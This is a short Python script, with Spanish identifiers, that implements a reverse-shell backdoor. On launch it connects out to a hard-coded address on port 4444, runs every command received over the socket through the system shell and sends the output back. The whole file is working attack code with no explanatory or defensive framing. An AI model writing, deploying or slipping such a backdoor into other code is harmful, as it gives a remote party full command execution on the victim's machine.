import socket
import subprocess

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def ejecutar_comando(self, command):
		return subprocess.check_output(command, shell=True)


	def run(self):
		while True:
			command = self.connection.recv(1024)
			resultados_comando = self.ejecutar_comando(command)
			self.connection.send(resultados_comando)

		connection.close()

puerta = Backdoor("192.168.0.207", 4444)
puerta.run()